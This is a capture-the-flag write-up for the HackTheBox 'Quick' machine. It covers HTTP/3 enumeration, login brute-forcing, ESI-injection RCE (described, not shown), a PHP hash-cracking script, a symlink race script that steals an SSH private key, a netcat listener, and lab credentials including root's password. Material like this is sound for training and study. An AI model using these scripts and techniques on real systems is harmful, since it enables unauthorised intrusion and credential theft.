<p align="center">
  <img src="https://github.com/cyberwr3nch/hackthebox/blob/master/writeups/assets/Quick.jpg" alt='HTB_quick'>
</p>

### Description:
- Enumerating ports in TCP and UDP
- Accessing the HTTP/3 protocol
- Logging in to the Webserver on port 9001
- ESI Injection on port 9001
- Shell as `sam`, `user.txt` is obatained
- Enumerated a vhost, `printerv2.quick.htb`
- Obtain the password for srvadm for logging in
- Creating a `symblink` for the `srvadm's id_rsa`
- ssh key obtained to login to the machine
- Analysing the cache file, a password is enumerted which is used to escalate as root
- `root.txt` is obtained

### Difficulty:

`Linux - Hard`

#### Enumeration

- Open ports `22, 9001` 
- Port `ssh` and `http`
- In the webpage, the clients name and organisation has been enumerated
- A new vhost `https://portal.quick.htb` is enumerated stating it uses the latest version of `http` either via [quiche](https://github.com/cloudflare/quiche) or with [curl](https://github.com/yurymuski/curl-http3) docker image
- Accessing the page via http3 gives documents and further usernames
- Password for logging into the login.php in the port 9001 has been enumerated
- Constructing an organizational email and bruteforcing with the password yields us the login access, 'elisa@wink.co.uk : Quick4cc3$$`


#### Obtaining Shell

- In the login page, we can see the web application is powered by `ESIGate` (a caching service for faster response)
- A vulnerability exists in ESI which could lead to RCE, a blog covering the vulnerability from [GoSecure](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
- With this RCE, Shell is obtained as `sam`
- `user.txt` is obtained

#### User srvadm

- After obtaining the shell as `sam`, roaming around the `/var/www` directory a new folder named `printer` and `jobs` has been enumerated
- Looking at the `apache configuration file` a new vhost `printerv2.quick.htb` has been enumerated
- Adding the vhost to the `hosts file` and accessing the page prompts a login page
- Taking a look at the `index.php` the login requires to have the user email as `srvadm@quick.htb` else the session wont start
- The password that is provided is encrypted with `crypt()` with the key `fa`
- We can either use the same algorithm to crack the passoword of the srvadm or we can alter the srvadm's password with mysql
- In the `db.php` the username, password and database has been enumerated
- Logging into the mysql service and looking for the hash
- After cracking / changing the password for the srvadm, login to the `printerv2.quick.htb`
- Adding a new printer in the webpage, which is our machine. Testing the connection with netcat
- Looking at the source code of jobs and printer.php, tells that the machine is pinged once and when a job is assigned to the machine it does the job and sends it to the printer
- Since the files that are processed with the mode `0777`, creating a symblink to access the internal files would be a better option since its being echoed back
- When a job is assigned to the printer, a file is created with the format `Y-m-d_H:i:s`
- And when the job is done, when the output is shown as text in the printer the job file dies
> In the following step you have to, run the bash script in the quick machine for symblinking, listen on port 9100 for the text output, and assign a job for the printer in the webpage
> 3 works simultaniously
- Creating a infinite loop to check the job files existance and symblinking it to another files is the potential way to own the user
- Confirming this with the known file `/etc/passwd` which provides the contents of the file, now on to the srvadm's id_rsa file

#### Privilege Escalation

- With srvadm's id_rsa being obtained in the listening netcat session, we can use it to login to the quick as srvadm
- In the home folder, a `.cache` folder is enumerated which containes the config files for the printer
- Looking for passwords in the config files yields a `url encoded` password
- Decoding the password, and trying it with the root provides the `root shell` `root@quick.htb : &ftQ4K3SGde8?`
- `root.txt` obtained

### Commands

```bash
# quiche installation
git clone --recursive https://github.com/cloudflare/quiche.git
cd quiche
sudo apt install cargo
sudo apt-get install cmake
cargo build --examples
cd target/debug/exampls

# dokcer curl image
docker pull ymuski/curl-http3

# Accessing the webpage
# with quiche 

# with curl 
docker run -it --rm ymuski/curl-http3 curl --http3 "https://10.10.10.186/"
```

```bash
# accessing mysql 
mysql -u db_adm -D quick -p
--> Password: db_p4ss

mysql> show tables;
+-----------------+    
| Tables_in_quick |    
+-----------------+    
| jobs            |    
| tickets         |    
| users           |    
+-----------------+    
3 rows in set (0.00 sec) 
mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)
```

```php
# cracking the password of the server admin
<?php
$hash = "e626d51f8fbfd1124fdea88396c35d05";
$wordlist = explode("\n", file_get_contents("/opt/payloads/rockyou.txt"));
foreach ($wordlist as $word ) {
        echo 'Trying the word: '. $word ."\n";
        $hashed = md5(crypt($word,"fa"));
        if ($hashed === $hash){
                echo "<==================================================================> \n";
                echo "The Password for the hash " .$hash . " is found \n";
                echo "Cracked: ". $word . "\n";
                echo "<==================================================================> \n";
                exit(0);
        }
}
echo "bad luck :(";
exit(1);
?>

<==================================================================> 
The Password for the hash e626d51f8fbfd1124fdea88396c35d05 is found 
Cracked: yl51pbx
<==================================================================> 

# changing the password for srvadmin
update users set password = "e626d51f8fbfd1124fdea88396c35d05" where name = "Server Admin";
```

```bash
# netcat listner
# netcat listens even after getting a connection
nc -lvnkp 9100
```

```bash 
# bash script to symblink the jobs to the required file
#!/bin/bash
for i in $(seq 1 90000); do
        x=$(ls /var/www/jobs/)
        if [[ $x ]];then
                rm -f /var/www/jobs/$x
                ls -la /var/www/jobs
                ln -s /home/srvadm/.ssh/id_rsa /var/www/jobs/$x
                ls -la /var/www/jobs
        fi
done


# oneliner
while true ; do N=`date +%Y-%m-%d_%H:%M:%S` ; if [[ -r $N ]] ; then rm -f $N ; ln -s /home/srvadm/.ssh/id_rsa $N ; fi ; done
```

```bash
# greping for the string password
grep -EnRi 'root|password' .
```

